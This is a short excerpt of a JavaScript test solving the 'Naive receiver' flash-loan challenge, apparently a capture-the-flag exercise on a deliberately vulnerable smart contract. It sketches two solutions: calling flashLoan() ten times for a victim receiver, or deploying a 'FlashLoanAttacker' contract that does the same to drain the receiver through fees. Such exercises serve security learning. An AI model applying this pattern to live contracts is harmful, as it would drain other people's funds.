...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Execution", async function () {
     ...
     *      1. Loop 10 times calling flashLoan()
     *      2. Deploy a custom contract that loops 10 times calling flashLoan()
     */
    ...
    //   await pool
    //     .connect(player)
    //     .flashLoan(receiver.address, ETH, 10n ** 18n, "0x");
    // }

    // Second solution:
    const FlashLoanAttackerFactory = await ethers.getContractFactory(
      "FlashLoanAttacker",
      player
    );
    await FlashLoanAttackerFactory.deploy(pool.address, receiver.address);
  });
